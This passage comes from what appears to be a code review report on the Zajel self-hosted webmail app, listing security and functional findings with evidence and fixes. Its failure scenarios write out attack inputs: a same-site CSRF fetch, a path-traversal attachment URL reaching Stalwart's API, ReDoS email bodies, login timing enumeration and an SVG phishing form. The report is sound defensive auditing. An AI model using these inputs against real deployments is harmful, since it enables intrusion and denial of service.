**Failure scenario.** An attacker times POST /login for candidate emails. The real master email answers in about 400 ms and others in about 840 ms. With the email confirmed, they can start the global lockout described in the reverse-proxy finding.

**Evidence.**

```
user.ts:53-56 `if (!row) { // Burn comparable time ... verifyPassword(password, hashPassword('timing-equalizer')); return undefined; }`
Measured in /tmp/zajel-test: wrong-password 397 ms vs unknown-email 841 ms (ratio 2.12).
```

### auth-security#10: Two simultaneous setup submissions can each create a master user

- **Severity:** low · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/routes/setup/+page.server.ts:32`

**Description.** The create action calls hasAppUser() and then awaits request.formData() before calling createAppUser, so two requests can both pass the check. app_user.email is UNIQUE, but with different emails both inserts succeed. Everything downstream assumes one master user: getFirstUser, the 'single row' schema comment, and the global byEmail lookup in linkAccount. Separately, a fresh instance can be claimed by anyone who reaches /setup first. There is no setup token, which matters when the DB is unexpectedly empty (see the NODE_ENV finding).

**Failure scenario.** The owner and someone scanning the new deployment both submit /setup?/create at about the same time. Both get a 303 and a session, and two app_user rows now exist. The second party keeps a permanent login that the owner never sees, because there is no user management UI.

**Evidence.**

```
setup/+page.server.ts:32-35 `if (hasAppUser()) return fail(409, ...); const data = await request.formData(); ...` then line 50 `const user = createAppUser(email, password);`
Scratch test with formData delayed by a tick: both actions returned {status:303}, and app_user contained attacker@example.com and owner@example.com.
```

### auth-security#11: Changing the master password signs out other sessions but leaves passkeys working, and adding a passkey needs no re-authentication

- **Severity:** low · **Kind:** security · **Reviewer confidence:** high
- **Location:** `src/routes/api/auth/change-password/+server.ts:18`

**Description.** Anyone holding a session cookie can register a passkey: register/options and register/verify only check locals.user, with no password confirmation. After a compromise, the user's response is to change the password. That revokes other sessions, and the UI says 'Other devices have been signed out', but every passkey stays valid. A session thief can therefore keep access across the password change. change-password itself has no rate limit, so a stolen session can also brute-force the current password through it, with one blocking scrypt per try.

**Failure scenario.** An attacker briefly gets a session cookie and registers their own passkey. The owner notices and changes the master password. The attacker signs straight back in with the passkey, which is still listed under a harmless default name such as 'Mac'.

**Evidence.**

```
change-password/+server.ts:17-18 `// Standard hygiene: a password change signs out every other device. revokeOtherSessions(locals.user.id, locals.sessionId);` (passkeys untouched)
passkey/register/options/+server.ts:5-7 `if (!locals.user) error(401...); return json(await registrationOptions(url, locals.user));`
```

### auth-security#12: JSON API routes rely only on SameSite=Strict: a sibling subdomain can send state-changing POSTs with no Content-Type

- **Severity:** low · **Kind:** security · **Reviewer confidence:** medium
- **Location:** `src/hooks.server.ts:42`

**Description.** SvelteKit's CSRF origin check (kit respond.js) only covers form content types: urlencoded, multipart and text/plain. A POST with no Content-Type header, such as a fetch with a Blob or ArrayBuffer body, is a CORS-simple request, gets no preflight, and passes SvelteKit's check. The API routes call request.json() whatever the Content-Type. SameSite=Strict blocks other sites, but not same-site origins. Self-hosters commonly run the mail server's web admin and other apps on sibling subdomains of the same domain, which counts as same-site. The handle hook has no Origin/Sec-Fetch-Site check for non-GET /api requests.

**Failure scenario.** Script running on another-app.example.com (an XSS in another self-hosted app) sends `fetch('https://webmail.example.com/api/accounts/switch', {method:'POST', credentials:'include', body:new Blob(['{"id":"…"}'])})`. The session cookie is attached, and SvelteKit's check is skipped because there is no Content-Type. The same works for other JSON POST endpoints in the app, such as sending mail or managing rules.

**Evidence.**

```
kit/src/utils/http.js is_form_content_type → `type = request.headers.get('content-type')?... ?? ''` → '' is not a form type → the respond.js:81-90 CSRF block is skipped.
hooks.server.ts handle (lines 42-143) has no Origin/Sec-Fetch-Site check; routes use `(await request.json())` unconditionally.
```

### auth-security: minor notes

- src/lib/jmap/auth.ts:5 (outside this slice, but it breaks linking): authenticate() builds Basic auth with btoa(), which throws on non-Latin-1 characters and encodes é/ü/ß as Latin-1 bytes. authStateForAccount (accounts.ts:251) uses UTF-8 Buffer encoding. Result: non-ASCII mail passwords cannot be linked or re-authenticated, and the user sees 'rejected those credentials' or a misleading network error.
- src/lib/server/auth/accounts.ts:88-97 describeLinkError labels every non-auth error as 'Unable to reach the mail server at …', including a SQLite UNIQUE violation from two concurrent links of the same address and btoa's InvalidCharacterError.
- src/routes/api/accounts/[id]/avatar/+server.ts:77-88 serves resolver output (raw BIMI or favicon.svg SVG) and uploaded image/svg+xml data URLs same-origin without the 'sandbox' CSP, nosniff and Content-Disposition headers that /api/avatar/+server.ts:85-93 adds for the same resolver. This is a hardening gap; script would only run if the avatar URL is opened as a page.
- src/lib/server/auth/crypto.ts:48 createDecipheriv('aes-256-gcm') without { authTagLength: 16 } accepts truncated 4-15 byte tags (Node DEP0182). Pass authTagLength explicitly.
- src/routes/api/accounts/+server.ts:47 and setup/+page.server.ts:77: the account color is stored unvalidated on link. PATCH validates /^#[0-9a-f]{6}$/, but link does not, and the value is interpolated into style= attributes (settings/accounts/+page.svelte:261, reauth/+page.svelte:83).
- src/routes/api/auth/passkey/login/options/+server.ts: an unauthenticated endpoint that writes a webauthn_challenges row on every call, with no rate limit. Rows are bounded only by the 5-minute TTL.
- src/lib/server/auth/webauthn.ts:59,102: userVerification 'preferred', but @simplewebauthn/server 13 defaults requireUserVerification=true, so security keys without a PIN fail with a generic error. Use 'required' for consistency.
- src/routes/api/events/+server.ts:40-42: a non-OK upstream body is never cancelled, an upstream 401 is not mapped to markNeedsReauth, and lines 45 and 62 log every SSE open and close at info level.
- src/routes/mailto/+server.ts:15-20: the protocol handler parses the mailto: URL, discards it and redirects to /inbox, so clicking any mailto: link loses the recipient, subject and body. The dead parser's decodeURIComponent can also throw partway.
- Dockerfile: runs as root (no USER node), and copies the full `npm ci` node_modules, devDependencies included (vitest, svelte-check, jsdom, typescript), into the runtime image. Run `npm prune --omit=dev` in the builder. There is also no HEALTHCHECK.
- .dockerignore misses local-data/ (the dev SQLite DB with the password hash, encrypted mail secrets and sessions), .test-build/ and .hermes/. COPY . . puts them in the builder stage layer and build cache.
- .github/workflows/ci.yml: no top-level `permissions: contents: read`, and actions are pinned by tag rather than SHA.
- src/lib/server/auth/user.ts:44-47 getFirstUser is dead code. Its doc says it is used for usernameless passkey login, but nothing calls it.
- src/hooks.server.ts:103-107: an account whose secret cannot be decrypted (rotated WEBMAIL_SECRET) is never flagged needs_reauth, so reauth/+page.server.ts:27-29 offers it as a 'continue with another account' target that bounces straight back to /reauth.
- No unit tests exist for any of src/lib/server/auth/* (password hashing, AES-GCM round-trip, rate-limit windows, session expiry, challenge single-use).
- Several JSON routes call request.json() outside a try (e.g. passkey/login/verify:8, accounts/switch:8, reorder:8), so a malformed body returns 500 instead of 400.
- src/routes/(app)/settings/security/+page.svelte:271: a passkey is removed with one click and no confirmation. Passkey rename (api/auth/passkeys/[id]) has no length cap.
- src/routes/(app)/settings/account/+page.svelte:189: saveDisplayName POSTs and calls invalidateAll() on every blur, even when the name is unchanged.
- src/lib/server/auth/accounts.ts:171-176 reorderAccounts accepts a partial or foreign id list, which can leave duplicate sort_order values.

## Slice: rendering-xss-attachments

Files read: 40. Skipped: none.

### rendering-xss-attachments#1: Quadratic regex rewriting of untrusted email HTML can freeze the browser tab and, during SSR, the Node server

- **Severity:** high · **Kind:** security · **Reviewer confidence:** high
- **Location:** `src/lib/utils/email-images.ts:260`

**Description.** prepareEmailForReading and rewrite use regexes on the raw sender HTML whose time grows with the square of the input when a tag has no closing '>': LINK_TAG and META_TAG (lines 260-261), the <base> regex (240), the <style> regex (250) and TAG (181). Each pattern looks like /<link\b(?:[^>"']|"…"|'…')*>/ and, from every '<link', '<a' or '<style' start, scans to the end of the body before failing. getEmailDetail fetches the whole body (fetchAllBodyValues with no maxBodyValueBytes). `display` is a $derived that SSR evaluates for /email/[id] (+page.server.ts loads the email, and no route sets ssr=false). So the server's single event loop runs this code. otp.ts htmlToText (lines 172-177; `<[^>]*>` and `<(style|script|head|title)\b[\s\S]*?<\/\1>`) has the same shape and also runs in SSR through the `otp` $derived. The client re-runs prepareEmailForReading every time remoteAllowed changes.

**Failure scenario.** An attacker sends a roughly 200 KB HTML body made of '<link' repeated. Measured in the scratch copy: prepareEmailForReading takes 19 s for 100 KB and 75 s for 200 KB. '<a' repeated takes 6 s for 80 KB, and '<style>' repeated takes 3.7 s for 280 KB. A 1-2 MB body runs for tens of minutes. On a single-account install the push worker links to /email/<id> (push/worker.ts:318). When the user taps the notification, the service worker navigates and SvelteKit SSRs the page. That blocks the whole Node process: every request, scheduled send, reminders, rules and push stop. Opening the message in the reading pane or on mobile freezes the tab instead.

**Evidence.**

```
email-images.ts:181 `const TAG = /<([a-z][a-z0-9:-]*)((?:[^>"']|"[^"]*"|'[^']*')*)>/gi;`
:260 `const LINK_TAG = /<link\b(?:[^>"']|"[^"]*"|'[^']*')*>/gi;`
EmailDetail.svelte:317 `const display = $derived(prepareEmailForReading(getBodyHtml(), …))`, which is used in srcdoc and therefore runs in SSR.
Timing run: `prepare <link x20000 18975 ms`, `prepare <link x40000 74463 ms`, `prepare <a x40000 (80000B) 5977 ms`, `otp htmlToText <head> x40000 1898 ms`.
```

### rendering-xss-attachments#2: Attachment endpoint throws (500) for any filename with characters above Latin-1 (Arabic, CJK, emoji)

- **Severity:** high · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/routes/api/email/[id]/attachment/[blobId]/+server.ts:63`

**Description.** The filename from `?name=` goes unchanged into `Content-Disposition: …; filename="${safeName}"`. Only double quotes are stripped. Header values must be ByteStrings, so `new Response(…, {headers})` throws a TypeError for any character above U+00FF. SvelteKit turns that into a 500, and the upstream body has already been fetched but is never consumed. Every consumer of attachmentUrl is affected: download, the image/PDF/text/docx/xlsx viewers, and cid: inline images in the reading view, which use part.name. A CR/LF in the name throws the same way. Latin-1 names such as 'résumé.pdf' are sent as raw bytes, which browsers decode inconsistently.

**Failure scenario.** Someone emails 'تقرير.pdf' or '報告.xlsx'. Opening the card or pressing Download returns HTTP 500. An HTML email whose cid image part is named 'صورة.png' shows a broken image. For an app called Zajel, Arabic filenames will be common.

**Evidence.**

```
const safeName = filename.replace(/"/g, '');
'Content-Disposition': `${disposition}; filename="${safeName}"`,
Scratch test: GET with name=تقرير.pdf -> `THROWS Cannot convert argument to a ByteString because the character at index 22 has a value of 1578 which is greater than 255.`, while name=report.pdf -> 200. Fix: send an ASCII fallback plus `filename*=UTF-8''${encodeURIComponent(name)}` (RFC 6266/5987).
```

### rendering-xss-attachments#3: Real attachments are hidden when they carry a Content-ID or inline disposition, and inline photos in multipart/mixed are shown nowhere

- **Severity:** high · **Kind:** bug · **Reviewer confidence:** medium
- **Location:** `src/lib/components/AttachmentBar.svelte:20`

**Description.** AttachmentBar drops every part with `disposition === 'inline'` or any `cid`, whether or not the body actually references it. Outlook/Exchange commonly puts a Content-ID on ordinary file attachments. Apple Mail sends attachments placed in the body with `Content-Disposition: inline`. Those PDFs and documents never get a card, so they can't be opened or downloaded. Separately, under RFC 8621's parse algorithm an inline image inside a top-level multipart/mixed (the iOS/Apple Mail 'text, photo, text' shape) goes into textBody/htmlBody and NOT into `attachments`. renderEmailBodyHtml (email-body.ts:46-57) renders only text parts that have bodyValues, so the photo is silently dropped from the body too. The README claim 'Attachments show as cards' (README:104) does not hold for these messages. This filter dates from the initial release.

**Failure scenario.** (1) An Outlook user sends a PDF with `Content-Disposition: attachment` plus `Content-ID: <…@namprd…outlook.com>`: `!a.cid` hides it. (2) Apple Mail sends a PDF as `application/pdf; Content-Disposition: inline` inside multipart/mixed: hidden. (3) An iPhone sends multipart/mixed{text/plain, image/jpeg inline, text/plain}: the photo is in neither the body nor the bar. The list row may still show a paperclip.

**Evidence.**

```
AttachmentBar.svelte:99-101 `attachments.filter((a) => a.disposition !== 'inline' && !a.cid)`
email-body.ts:46 `filter((p) => p.type?.toLowerCase().startsWith('text/html') && valueOf(p) !== undefined)`, so image/* parts in htmlBody are never emitted.
Fix: have rewriteEmailImages report which cids it actually resolved, hide only those, and render or list inline media parts from htmlBody.
```

### rendering-xss-attachments#4: Attachment proxy is open to path traversal: blobId is not encoded, so a link can make the server send arbitrary authenticated GETs to Stalwart

- **Severity:** medium · **Kind:** security · **Reviewer confidence:** high
- **Location:** `src/routes/api/email/[id]/attachment/[blobId]/+server.ts:41`

**Description.** SvelteKit decodes route params with decodeURIComponent after matching (decode_params), so `%2F`, `..` and `%3F` reach `params.blobId` as '/', '..' and '?'. The value is interpolated unencoded into the JMAP download URL and fetched with the user's Authorization header. WHATWG URL normalisation then resolves the dot segments, and a '?' moves the appended filename into the query. The invitation endpoints already use encodeURIComponent(blobId). Stalwart's management API sits on the same host, and some of its endpoints are state-changing GETs (for example reload/update). Because the reading frame is same-origin, a link clicked in an email counts as a same-site navigation, so the SameSite=strict session cookie is sent.

**Failure scenario.** An email contains a link to `https://mail.victim/api/email/x/attachment/..%2F..%2F..%2Fapi%2Freload%3F?name=a`. When the user clicks it, the webmail server issues `GET https://stalwart/api/reload?/a` with the user's Basic or Bearer credentials. If the user's Stalwart principal is an admin, as is common on single-user homelab installs, the request runs as admin. The attacker cannot read the response, but any GET-triggered action happens.

**Evidence.**

```
const downloadUrl = `${locals.auth.apiUrl}download/${locals.auth.accountId}/${params.blobId}/${encodeURIComponent(filename)}`;
Scratch test with params.blobId='../../../api/reload?' and apiUrl 'https://stalwart.test/jmap/' -> fetched `https://stalwart.test/api/reload?/a.txt`.
Compare invitation/+server.ts:20 `${encodeURIComponent(blobId)}`.
```

### rendering-xss-attachments#5: XLSX preview shows columns past 50 as blank, can render thousands of empty columns, and fails on large sheets

- **Severity:** medium · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/lib/components/viewers/XlsxViewer.svelte:51`

**Description.** Rows are cut to MAX_COLS=50 (line 45), but colCount is computed from the untruncated rows and the template loops `Array(sheet.colCount)`. Every column after the 50th therefore renders as an empty cell under a real column letter, with no notice that anything was cut. With `header:1, defval:null` each row is as wide as the sheet's range, so a stray cell in a far column (up to XFD = 16384) makes the table render up to 1000 x 16384 = 16M <td> and hang the tab. `Math.max(...allRows.map(…))` also throws 'Maximum call stack size exceeded' above about 150k rows (spread argument limit), so large sheets show that error instead of a preview. The whole workbook is parsed on the main thread even though only 1000 rows are shown.

**Failure scenario.** A finance export with 80 columns: columns AY-CB show as empty even though they contain data, which misleads the reader. A sheet with formatting out to column XFD freezes the browser. A 200k-row CSV saved as xlsx shows 'Maximum call stack size exceeded'.

**Evidence.**

```
const truncatedRows = allRows.slice(0, MAX_ROWS_PER_SHEET).map((r) => Array.isArray(r) ? r.slice(0, MAX_COLS) : []);
colCount: Math.max(...allRows.map((r) => Array.isArray(r) ? r.length : 0), 0)
{#each Array(sheet.colCount) as _, colIdx} {@const cell = row[colIdx]} … {cell ?? ''}
node: Math.max(...new Array(200000).fill(1)) -> RangeError. Fix: cap colCount at MAX_COLS, compute it with a loop, and pass `sheetRows: MAX_ROWS+1` to XLSX.read.
```

### rendering-xss-attachments#6: Pasted images are sent as WebP data: URIs, which Gmail and Outlook recipients won't display

- **Severity:** medium · **Kind:** bug · **Reviewer confidence:** medium
- **Location:** `src/lib/utils/image-compress.ts:1`

**Description.** compressImageForBody re-encodes pasted images to WebP and returns a data: URL. ComposerShell.svelte:187 inserts that URL straight into the TipTap image src. Nothing in the send path (/api/send, compose-input, buildEmailCreate) converts data: images into cid: multipart/related parts, so the outgoing HTML contains `<img src="data:image/webp;base64,…">`. Gmail strips data: URI images, Outlook for Windows does not show base64 data URIs, and classic Outlook cannot decode WebP either. Embedding the image in the HTML also roughly triples the body size (base64 adds about 33%, and the HTML part is then quoted in every reply).

**Failure scenario.** A user pastes a screenshot into a reply to a Gmail or Outlook contact. The sender sees it, but the recipient sees a blank space or a broken image icon.

**Evidence.**

```
image-compress.ts:1-4 `Compress an image File to a data URL for inline embedding in email HTML … re-encodes as WebP`
:217 `renderToWebp(...)`; :219 `return blobToDataUrl(blob)`
ComposerShell.svelte:187-188 `const dataUrl = await compressImageForBody(file); editor?.chain().focus().setImage({ src: dataUrl })`. No data:-to-cid conversion exists anywhere in src/ (grep). Fix: encode as JPEG/PNG and upload as an inline blob referenced by cid:.
```

### rendering-xss-attachments#7: Print prints the app page, without the message's subject, sender or date, and clips the body to its on-screen box

- **Severity:** medium · **Kind:** ux · **Reviewer confidence:** medium
- **Location:** `src/lib/components/EmailDetail.svelte:936`

**Description.** The Print button calls window.print() on the whole app. The global print stylesheet (layout.css:585-593) hides every `header` element, which includes EmailDetail's own <header> (line 984) holding the subject, From, To/Cc and date. The message body is an iframe sized `h-full` inside `flex-1 overflow-hidden`, and browsers print an iframe at its laid-out size, so only the visible part of a long email is printed. The `.email-body` print rule matches nothing (that class no longer exists). In split view the message list column also prints.

**Failure scenario.** The user opens a 3-page receipt and presses Print. The output has no subject, sender or date and only the first screenful of the receipt.

**Evidence.**

```
EmailDetail.svelte:936 `<button onclick={() => window.print()} …>`; :984 `<header …>` contains the subject, from and date; :1219 `<iframe srcdoc={iframeContent} … class="w-full h-full …">`
layout.css:585 `@media print { aside, header, .ribbon, .compose-modal { display: none !important; } .email-body {…} }`. Fix: build a print document (headers plus display.html) and print it from a dedicated frame's contentWindow.
```

### rendering-xss-attachments#8: Email can undo the reading frame's no-referrer policy (meta referrer, referrerpolicy, rel=opener are not normalised)

- **Severity:** low · **Kind:** security · **Reviewer confidence:** medium
- **Location:** `src/lib/components/EmailDetail.svelte:343`

**Description.** The frame prepends `<meta name="referrer" content="no-referrer">` and the comment promises 'no-referrer keeps the address of this webmail out of any link you follow'. prepareEmailForReading removes only refresh metas (email-images.ts:278) and leaves <a> attributes untouched. Under the HTML spec the last `<meta name=referrer>` processed wins, wherever it is in the document, and a per-link `referrerpolicy` attribute overrides the document policy. For a srcdoc document the referrer source is the parent page URL. `rel="opener"` likewise restores window.opener on target=_blank popups, which escape the sandbox because of allow-popups-to-escape-sandbox.

**Failure scenario.** A newsletter includes `<meta name="referrer" content="unsafe-url">`, or `<a referrerpolicy="unsafe-url" href=…>`. Every clicked link then sends a Referer like `https://mail.home.example/email/Mabc` or `/search?q=<private query>` to the sender, revealing the self-hosted webmail's hostname and paths.

**Evidence.**

```
EmailDetail.svelte:341-345: CSP meta, `<meta name="referrer" content="no-referrer">`, `<base target="_blank">`, then `${display.html}` with the email's own metas kept.
email-images.ts:278 `.replace(META_TAG, (tag) => (REFRESH.test(tag) ? '' : tag))`. Fix: strip all <meta name=referrer>, and rewrite every <a> to set rel="noopener noreferrer", drop referrerpolicy, and force target=_blank.
```

### rendering-xss-attachments#9: Image proxy buffers up to 10 MB per request in memory with no concurrency limit

- **Severity:** medium · **Kind:** performance · **Reviewer confidence:** medium
- **Location:** `src/routes/api/image-proxy/+server.ts:26`

**Description.** Each proxied image is read fully into memory (safeFetch readCapped collects chunks, then Buffer.concat, which briefly doubles the footprint) up to MAX_BYTES = 10 MB before sniffing and replying. There is no per-user concurrency cap, no server-side cache and no streaming. Behind an HTTP/2 reverse proxy the browser requests all of a message's images at once. The sender controls how many images there are, which hosts they point at and how big they are.

**Failure scenario.** Remote images are loaded ('Always', a contact or a spoofed contact From under 'Contacts only', or the user clicks 'Load images'). A message with 300 <img> pointing at distinct 10 MB files makes the server hold several GB in transit, which OOM-kills a small homelab container and takes the webmail down.

**Evidence.**

```
const MAX_BYTES = 10 * 1024 * 1024;
const fetched = await safeFetch(parsed.toString(), { maxBytes: MAX_BYTES, … });
return new Response(new Uint8Array(fetched.bytes), …)
Suggestion: sniff the first bytes and then stream with a byte cap, lower the cap (2-5 MB), and add a small global semaphore.
```

### rendering-xss-attachments#10: Attachment Content-Type is chosen only from the client-supplied name extension, and the inline CSP lacks sandbox/form-action

- **Severity:** low · **Kind:** bug · **Reviewer confidence:** medium
- **Location:** `src/routes/api/email/[id]/attachment/[blobId]/+server.ts:52`

**Description.** The JMAP download URL omits the type/`accept` parameter, so (as the code's own comment notes) the server returns application/octet-stream, and the effective type comes from MIME_OVERRIDES keyed on the `name` query param. The part's real MIME type, which the client already has in a.type, is never used. detectKind marks a part as pdf/image from its MIME type even without a matching extension. The iframe or img then receives octet-stream with nosniff and disposition inline, so the PDF downloads or shows blank instead of previewing. The inline CSP (line 67) also omits `sandbox`, `form-action` and `frame-ancestors`, unlike the avatar and image-proxy responses. An SVG attachment opened directly (for example via 'Open image in new tab') can therefore render a <foreignObject> form that posts anywhere, on the webmail's own origin.

**Failure scenario.** An attachment named 'Invoice' with type application/pdf is classified as pdf, but the iframe gets octet-stream and the browser downloads it instead of previewing. Separately, a sender attaches 'x.svg' containing a fake 'session expired, sign in' form. Opened in its own tab, it is served from https://mail.example/... and the form submits to the attacker.

**Evidence.**

```
const effectiveType = upstreamType.startsWith('application/octet-stream') && MIME_OVERRIDES[ext] ? MIME_OVERRIDES[ext] : upstreamType;
'Content-Security-Policy': "default-src 'none'; img-src 'self' data:; style-src 'unsafe-inline'"
detect.ts:20 `if (mime === 'application/pdf' || ext === 'pdf') return 'pdf';`
```

### rendering-xss-attachments#11: Service-worker avatar cache never revalidates, so the server's 30-day refresh and ETag never reach the browser

- **Severity:** low · **Kind:** improvement · **Reviewer confidence:** high
- **Location:** `src/service-worker.ts:193`

**Description.** avatarCacheFirst serves any cached 200 forever. The cache is unversioned, survives deploys, and is trimmed only FIFO at 600 entries. The server re-resolves avatars every 30 days (avatars/index.ts FOUND_TTL_MS) and sends `Cache-Control: private, max-age=86400` and an ETag, but the worker ignores both. A sender whose first resolution was a low-quality favicon, who later publishes BIMI, or whose company rebrands keeps the old image in that browser indefinitely. The comment's premise that 'avatars are immutable per sender' is not what the server implements.

**Failure scenario.** A company changes its logo. The server picks up the new one after 30 days, but every browser that cached the old one keeps showing it until 600 newer avatars push it out.

**Evidence.**

```
const hit = await cache.match(request); if (hit) return hit;  (no age check or revalidation)
index.ts:21 `const FOUND_TTL_MS = 30 * 24 * 60 * 60 * 1000;`
Fix: stale-while-revalidate (serve the hit, refetch with If-None-Match in the background), or store a date and expire after the server TTL.
```

### rendering-xss-attachments#12: Notification click does nothing when the open window isn't controlled by the service worker

- **Severity:** low · **Kind:** ux · **Reviewer confidence:** high
- **Location:** `src/service-worker.ts:148`

**Description.** notificationclick picks any same-origin window, including uncontrolled ones (includeUncontrolled: true), and calls WindowClient.navigate(). The spec rejects navigate() with a TypeError when the client is not controlled by this worker. The error is swallowed, so the window is focused but stays where it was. Since the worker deliberately calls neither skipWaiting nor clients.claim, the tab that installed the worker and any hard-reloaded tab are uncontrolled.

**Failure scenario.** On first use after install, or after a Shift+Reload, the user taps a new-mail notification. The app comes to the front on whatever page it was showing instead of opening the message.

**Evidence.**

```
const windows = await sw.clients.matchAll({ type: 'window', includeUncontrolled: true });
… await open.navigate(target.href).catch(() => {}); return;
Fix: if navigate rejects (or returns null), fall back to clients.openWindow(target.href), or postMessage the page to goto().
```

### rendering-xss-attachments: minor notes

- src/lib/utils/html-to-text.ts:130-131 String.fromCodePoint is called on numeric entities without a range check: '&#1114112;' throws RangeError. A sender can reach it through the List-Unsubscribe mailto `?body=` (unsubscribe/+server.ts:116 passes it to sendEmail, which runs htmlToText), and the unsubscribe then fails with 500. otp.ts:182 already guards this.
- src/routes/api/email/[id]/unsubscribe/+server.ts:116 the mailto `body=` parameter is treated as HTML (sent as htmlBody) and is not escaped. The confirm() dialog (EmailDetail.svelte:775) shows neither the destination address nor the subject and body the sender chose.
- src/lib/utils/list-unsubscribe.ts:9 entries() trims but keeps whitespace inside <…>. RFC 2369 says whitespace inside the brackets is to be ignored, so a URL folded mid-way becomes wrong (space becomes %20).
- src/routes/api/email/[id]/attachment/[blobId]/+server.ts:64 `Content-Length: res.headers.get('Content-Length') ?? ''` sends an empty Content-Length when upstream has none. Nginx and Caddy reject that as an invalid upstream response. undici may also have decompressed a gzip body while the compressed length is still forwarded.
- src/lib/utils/email-images.ts:182 ATTR needs whitespace before an attribute name, so `<img/src="…">` is never proxied or counted as blocked. The frame CSP stops it loading, so it shows as a broken image rather than leaking.
- src/lib/utils/email-images.ts:263 REFRESH does not decode entities (http-equiv="&#x72;efresh"). It doesn't matter in practice because sandbox without allow-scripts already blocks meta refresh, but README:305's 'meta refreshes are removed' is not strictly true.
- src/lib/components/viewers/TextViewer.svelte:15/36 res.text() always decodes as UTF-8, so Windows-1256/Shift_JIS CSVs (Excel's default on Arabic Windows) show mojibake. The CSV preview also splits on ',' without honouring quotes, so quoted fields shift columns.
- src/lib/components/viewers/ImageViewer.svelte:66 has no onerror fallback. image/heic, image/tiff and other undecodable images (kind 'image' by MIME prefix) show an empty modal with no download hint.
- src/lib/components/EmailDetail.svelte:906 the trustSender result (added / already-trusted / unsupported) is ignored, so the user gets no confirmation. In the reading pane, `email` isn't refreshed, so the Junk-only buttons stay after the message has moved to Inbox.
- src/lib/server/trust-sender.ts:70/101 uses a full-text `text` filter with limit 20 and then exact-matches client-side. If the real card isn't in the top 20 results, the sender reads as unknown and trustSender creates a duplicate card. A ContactCard/query `email` filter condition would be exact.
- src/lib/components/EmailDetail.svelte:302-307 the 'contacts_only' image policy trusts the From header, which can be spoofed. A forged contact address loads trackers. Consider requiring DMARC/auth pass (Jev already computes authentication facts).
- src/lib/components/ProfileCard.svelte:151-157 profilePhoto.save() is not awaited, so `saving` never shows and errors are unhandled. setAvatar ignores the HTTP status, and the raw-file fallback (line 139, e.g. HEIC that canvas can't decode) can exceed the 2 MB cap. The UI shows the new photo, which is gone after reload. handleFileChange also duplicates fileToAvatarDataUrl from utils/image.ts.
- src/routes/api/image-proxy/+server.ts:31-35 sniffAvif accepts only major brand avif/avis. AVIF files with major brand 'mif1' and avif as a compatible brand get 415 and a broken image.
- static/manifest.webmanifest:242 registers the PWA as the mailto: handler, but /mailto discards the address and just redirects to /inbox (product decision noted in mailto/+server.ts). With the SameSite=strict session cookie, a cross-site mailto launch may also land on /login.
- src/lib/utils/email-body.ts:32 plain-text bodies are shown in <pre> without linkifying URLs and without format=flowed unwrapping.
- Cross-slice (root cause in hooks.server.ts and the active_account cookie, not this slice): attachment, unsubscribe, mark-read (EmailDetail.svelte:386-399) and trash requests resolve the email id against whichever account is currently active. A tab left open after switching accounts in another tab can act on a different account's message with a colliding Stalwart id.

## Slice: jmap-send-pipeline

Files read: 38. Skipped: none.

### jmap-send-pipeline#1: Trash, Archive, Spam and Move from the Starred and Search views copy the message instead of moving it

- **Severity:** high · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/routes/api/email/bulk/+server.ts:112`

**Description.** Move-style actions only remove the mailbox the client names as the source. On /flagged and /search, EmailList is rendered without a mailboxId, so its default '' is posted as sourceMailboxId (EmailList.svelte:27, :166, :236). The bulk route passes '' through (`sourceMailboxId ?? ''` at :87, :112, :131), and moveEmail/moveEmails/markManyAsSpam turn a falsy source into `remove: []` (email.ts:652, :674, :752). The target mailbox gets added and nothing is removed. The single-row actions there have a similar weakness: EmailListItem falls back to `Object.keys(email.mailboxIds)[0]`, which can be a label. The underlying problem is that the server trusts a client-supplied source for trash/archive/spam instead of working out which mailboxes to remove itself.

**Failure scenario.** In Starred, select 3 messages that are in Inbox and click Trash. Each one gets mailboxIds {Inbox:true, Trash:true}. They stay in the Inbox and also show in Trash. After the retention period, trash-retention.ts counts Inbox as 'filedElsewhere' and only takes them out of Trash, so they are never deleted. Archive or Spam from search results does nothing visible (the message stays in Inbox). 'Move to…' from Starred or Search copies the message instead of moving it.

**Evidence.**

```
bulk/+server.ts:112 `: trashEmail(client, accountId, id, sourceMailboxId ?? '', trashId)`; email.ts:651-652 `remove: sourceMailboxId && sourceMailboxId !== targetMailboxId ? [sourceMailboxId] : []`; flagged/+page.svelte renders `<EmailList ... title="Starred" />` with no mailboxId. I checked this with a vitest against the route: every Email/set update came out as {"INBOX":true,"TRASH":true}.
```

### jmap-send-pipeline#2: Attachments over 1 MB cannot be uploaded in the shipped Docker image, despite the 25 MB limit

- **Severity:** high · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/routes/api/upload/+server.ts:5`

**Description.** The upload route and the composer both promise 25 MB per attachment (MAX_BYTES here, MAX_ATTACHMENT_BYTES in ComposerShell). But the route reads the whole body through `request.formData()`, which goes through adapter-node's BODY_SIZE_LIMIT. The Dockerfile sets that to 1M (Dockerfile:21), and it is 512K when the env var is unset. Any larger request gets a 413 ("Content-length of N exceeds limit of 1048576 bytes") before the handler's own size check runs. The same limit also hits /api/send and /api/draft when the HTML body carries pasted data: images. Part of the cause is in the Dockerfile, but the 25 MB contract that cannot be met lives here, and the README does not mention it.

**Failure scenario.** On the docker-compose deployment, attach a 3 MB PDF. The composer accepts it (under 25 MB) and POSTs to /api/upload. adapter-node rejects the request with 413, `res.json()` fails, and the user sees 'Could not upload "file.pdf"'. Any attachment over 1 MB fails this way.

**Evidence.**

```
Dockerfile:21 `ENV BODY_SIZE_LIMIT=1M`; adapter-node handler.js:25 `parse_as_bytes(env('BODY_SIZE_LIMIT','512K'))` -> kit node/index.js raises SvelteKitError(413) when content_length > limit; upload/+server.ts:18 `await request.formData()` runs before the `file.size > MAX_BYTES` check.
```

### jmap-send-pipeline#3: A failed draft create still destroys the previous draft, so the message can be lost when the composer is closed

- **Severity:** medium · **Kind:** data-loss · **Reviewer confidence:** high
- **Location:** `src/lib/jmap/email.ts:274`

